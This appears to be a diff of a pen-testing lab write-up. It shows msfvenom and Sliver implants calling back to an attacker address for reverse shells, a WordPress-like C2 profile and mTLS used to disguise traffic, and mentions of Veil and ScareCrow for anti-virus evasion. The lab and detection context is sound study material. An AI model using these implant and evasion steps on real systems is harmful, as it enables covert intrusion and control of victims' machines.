@@ -3,7 +3,6 @@
 - Create malware using **Msfvenom** that calls "home" and establishes a **reverse shell**
 - Accept the connection using Metasploits `multi/handler`
 
-
 ## What's msfvenom?
 A payload generator and encoder
 - Source: msfvenom man pages
@@ -14,7 +13,6 @@ A payload generator and encoder
 $ vagrant up ub1404
 ```
 More on ms3 [here](<https://github.com/rapid7/metasploitable3>) and how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>) using libvirt as the provider.
-
 
 ## Reverse 🐚
 Fire up Kali and straight to man pages we go:
@@ -40,6 +38,7 @@ Flags explained:
   - `Executable & Linkable Format` is a binary format which can be executed on the system 
 - `-o`: Where to store output: `legitBin` A.K.A `Totally Legit Binary you Should Execute!`
 
+
 > [!TIP]
 > Use tab completion to your advantage. For example, after specifying the platform and architecture `linux/x86/`, press tab a few times to get all the available options for that specific `OS/Arch`!
 >
@@ -63,7 +62,6 @@ msf > use exploit/multi/handler
 - `payload`: Match it with the one we created the payload with
 
 Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.
-
 
 Get the ip of the victim:
 ```bash
@@ -90,7 +88,11 @@ The listener catches the connection and the attacker effectively now has a rever
 
 
 
+
+
 --------------
+
+
 
 
 
@@ -126,6 +128,10 @@ This makes it obvious that somebody is connected to the machine and executing sh
 # C) Hello Sliver
 **Objective**
 - Show an example of an HTTP-connection using Sliver
+
+
+<img width="948" height="224" alt="2026-05-01-19:29:33" src="https://github.com/user-attachments/assets/7f013b43-060f-43b5-b046-a6a82179ed2b" />
+
 
 ## Sliver?
 "A powerful [command and control framework](<https://sliver.sh/>) designed to provide advanced capabilities for covertly managing and controlling remote systems"
@@ -265,7 +271,13 @@ This is suspicious to me as a plain text http request would usually have some am
 
 
 
+
+
+
 -------------
+
+
+
 
 
 
@@ -276,11 +288,148 @@ This is suspicious to me as a plain text http request would usually have some am
 - Try and show an example
 - Showcase that it works
 
+## Totally legit web server!
+We want the web traffic to look a bit more legit, so we generate a `c2profile` usin a wordlist of URLs.
 
-# F) Multitalent
+If you have `seclists` installed you can use: `/usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-x.x.x.txt`, the version i'm using is 3.3.1, depending on when you're reading this the version might differ for you!
+
+Now that we have a wordlist to use, let's create a profile:
+```console
+sliver > c2profiles generate -f /usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt -n wordpress -i
+
+C2 profile generated and saved as wordpress
+```
+**Explained**
+- `-f` - Path to file containing URL list
+- `-n` - HTTP C2 Profile name
+- `-i` - Import generated profile after creation
+
+<img width="766" height="242" alt="2026-05-01-18:59:41" src="https://github.com/user-attachments/assets/e7561949-ae6c-40bb-8630-567b24d0c4cd" />
+
+
+We then generate a new implant based for the profile:
+```console
+sliver > generate -b 192.168.130.233 -o linux -C wordpress
+
+[*] Generating new linux/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m15s
+[*] Implant saved to /home/steve/box/sliver/POWERFUL_COCOA
+```
+You already know the other flags, now we're introducing:
+- `-C`: c2 profile
+
+We rename the file and send it away:
+```bash
+$ mv POWERFUL_COCOA background_agent
+$ rsync -av background_agent vagrant@192.168.130.202:/home/vagrant
+```
+
+Back in the console we issue the `jobs` command to check if we still have a listener active:
+```console
+sliver > jobs
+
+ ID   Name   Protocol   Port   Domains 
+==== ====== ========== ====== =========
+ 1    http   tcp        80             
+```
+Now we just let the listener catch the incoming connection:
+
+<img width="1516" height="517" alt="2026-05-01-19:15:50" src="https://github.com/user-attachments/assets/36985793-bd21-4d7c-ba66-c31fa157b1d2" />
+
+It looks a bit more legit now. Take a look at the GET URL:
+
+<img width="1374" height="592" alt="2026-05-01-19:20:17" src="https://github.com/user-attachments/assets/01b40b71-5b8f-4769-91f8-5205589cecd3" />
+
+**Akismet:**
+- <img width="953" height="528" alt="2026-05-01-19:21:17" src="https://github.com/user-attachments/assets/0a14a603-af3f-4624-a598-20b76d006b17" />
+
+Another one:
+
+<img width="1377" height="209" alt="2026-05-01-19:22:14" src="https://github.com/user-attachments/assets/4192aa22-9743-455c-8aea-35e183f1d02d" />
+
+
+
+There's something else we can do to obfuscate the connection even more: use `Wireguard` or `mTLS`. I'm going to start with mTLS A.K.A Mutual TLS.
+
+
+```console
+sliver > generate -m 192.168.130.233 -o linux -C wordpress
+
+[*] Generating new linux/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m34s
+[*] Implant saved to /home/steve/box/sliver/TROPICAL_DRESS
+
+```
+**New flag**
+`-m`: mtls string
+
+I renamed the payload to `mtls` in my own directory as we're starting to rack up payloads so I need a way to identify them.
+
+This time we don't start an http listener, but rather one that can handle the mTLS connection like so:
+```console
+sliver > mtls
+[*] Starting mTLS listener ...
+[*] Successfully started job #1
+
+sliver > jobs
+
+ ID   Name   Protocol   Port   Domains 
+==== ====== ========== ====== =========
+ 1    mtls   tcp        8888
+```
+**The victim executes the binary and we have a reverse shell:**
+
+```console
+[*] Session 68b2f9b2 TROPICAL_DRESS - 192.168.130.202:35978
+
+sliver > use 68b2f9b2 
+
+[*] Active session TROPICAL_DRESS (68b2f9b2-d3d5-44a3-8f84-40e6672d7202)
+```
+<img width="778" height="128" alt="2026-05-01-19:55:50" src="https://github.com/user-attachments/assets/f65e3585-bf7c-4b44-ba42-4af05630caab" />
+
+
+### What's goin on?
+Well the traffic is encrypted, so it's much harder to say:
+
+<img width="1521" height="273" alt="2026-05-01-19:50:55" src="https://github.com/user-attachments/assets/1a1636f6-2ac5-4568-9eff-bb785d87639c" />
+
+<img width="1448" height="209" alt="2026-05-01-19:51:15" src="https://github.com/user-attachments/assets/ecde7040-780a-437c-a3ad-ef6bb9a81436" />
+
+### Follow (encrypted) TCP Stream
+<img width="1389" height="840" alt="2026-05-01-19:52:20" src="https://github.com/user-attachments/assets/bcd74389-d7d0-4699-80b5-5bd7a66773e9" />
+
+
+
+
+----------------
+
+
+
+
+
+
+
+# F) Feature Rich
 **Objective**
 - Sliver is good for a lot
 - Show examples of some of it's features
+
+## Multitalent
+
+<img width="693" height="519" alt="WIP" src="https://github.com/user-attachments/assets/8a770c06-cc74-4ea6-a679-01db820bf244" />
+
+
+
+
+
+
+----------------
+
+
+
 
 
 
@@ -288,17 +437,45 @@ This is suspicious to me as a plain text http request would usually have some am
 **Objective**
 - Try out Veil
 
+## About
+Veil is designed to generate Metasploit payloads that bypass common anti-virus solutions.
+
+Install it on Kali:
+```bash
+$ sudo apt update && sudo apt install veil -y
+```
+
+
+
+
+
+
+---------
+
+
+
+
+
 
 # J) Bonus: ScareCrow
 **Objective**
 - Try out ScareCrow
 
+## About
+ScareCrow is a payload creation framework for side loading into a legitimate Window process.
+
+
+
+
+--------
+
+
+
 # K) Bonus: PoshC2
 **Objective**
-- Create malware that executes a reverse shell using PoshC2
-
+- Create malware that spins up a reverse shell using PoshC2
 
 
 # L) Bonus: Mythic
 **Objective**
-- Create malware that executes a reverse shell using Mythic
+- Create malware that spins up a reverse shell using Mythic
